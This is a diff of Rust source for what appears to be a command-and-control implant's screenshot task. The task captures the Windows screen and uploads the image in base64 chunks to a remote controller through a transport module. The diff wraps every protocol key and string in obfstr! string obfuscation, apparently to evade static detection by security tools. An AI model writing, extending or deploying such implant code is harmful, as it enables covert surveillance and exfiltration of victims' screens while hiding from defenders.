@@ -1,3 +1,5 @@
+use obfstr::obfstr;
+
 pub fn screenshot(task: &serde_json::Value) -> Result<(), Box<dyn std::error::Error>> {
     use std::{env::temp_dir, fs::{File, metadata}, io::{Read, Write}, path::PathBuf};
     use winapi::um::{
@@ -12,7 +14,7 @@ pub fn screenshot(task: &serde_json::Value) -> Result<(), Box<dyn std::error::Er
     const CHUNK_SIZE: usize = 4096;
 
     let id = task["id"].as_str().ok_or("missing task id")?;
-    let timestamp = task["timestamp"].as_f64().ok_or("missing timestamp")?;
+    let timestamp = task[obfstr!("timestamp")].as_f64().ok_or("missing timestamp")?;
 
     // ---- CAPTURE SCREEN ----
     let (width, height, buf) = unsafe {
@@ -71,14 +73,14 @@ pub fn screenshot(task: &serde_json::Value) -> Result<(), Box<dyn std::error::Er
     let total_chunks = size / CHUNK_SIZE + (size % CHUNK_SIZE > 0) as usize;
 
     let init = serde_json::json!({
-        "action": "post_response",
-        "responses": [{
-            "task_id": id,
-            "completed": true,
-            "download": {
-                "total_chunks": total_chunks,
-                "full_path": path.to_string_lossy(),
-                "chunk_size": CHUNK_SIZE,
+        obfstr!("action"): obfstr!("post_response"),
+        obfstr!("responses"): [{
+            obfstr!("task_id"): id,
+            obfstr!("completed"): true,
+            obfstr!("download"): {
+                obfstr!("total_chunks"): total_chunks,
+                obfstr!("full_path"): path.to_string_lossy(),
+                obfstr!("chunk_size"): CHUNK_SIZE,
                 "is_screenshot": true
             }
         }]
@@ -86,7 +88,7 @@ pub fn screenshot(task: &serde_json::Value) -> Result<(), Box<dyn std::error::Er
     .to_string();
 
     let init_resp: serde_json::Value = crate::transport::send_request_with_response(&init)?;
-    let file_id = init_resp["responses"][0]["file_id"]
+    let file_id = init_resp[obfstr!("responses")][0][obfstr!("file_id")]
         .as_str()
         .ok_or("missing file_id")?;
 
@@ -98,14 +100,14 @@ pub fn screenshot(task: &serde_json::Value) -> Result<(), Box<dyn std::error::Er
         if n == 0 { break; }
         let chunk_data = general_purpose::STANDARD.encode(&buffer[..n]);
         let payload = serde_json::json!({
-            "action": "post_response",
-            "responses": [{
-                "task_id": id,
-                "completed": true,
-                "download": {
-                    "chunk_num": chunk_num,
-                    "file_id": file_id,
-                    "chunk_data": chunk_data
+            obfstr!("action"): obfstr!("post_response"),
+            obfstr!("responses"): [{
+                obfstr!("task_id"): id,
+                obfstr!("completed"): true,
+                obfstr!("download"): {
+                    obfstr!("chunk_num"): chunk_num,
+                    obfstr!("file_id"): file_id,
+                    obfstr!("chunk_data"): chunk_data
                 }
             }]
         })
@@ -115,14 +117,14 @@ pub fn screenshot(task: &serde_json::Value) -> Result<(), Box<dyn std::error::Er
     }
 
     let done = serde_json::json!({
-        "action": "post_response",
-        "responses": [{
-            "task_id": id,
-            "user_output": format!("Screenshot uploaded as {}", file_id),
-            "agent_file_id": file_id,
-            "status": "success",
-            "timestamp": timestamp,
-            "completed": true
+        obfstr!("action"): obfstr!("post_response"),
+        obfstr!("responses"): [{
+            obfstr!("task_id"): id,
+            obfstr!("user_output"): format!("Screenshot uploaded as {}", file_id),
+            obfstr!("agent_file_id"): file_id,
+            obfstr!("status"): obfstr!("success"),
+            obfstr!("timestamp"): timestamp,
+            obfstr!("completed"): true
         }]
     })
     .to_string();
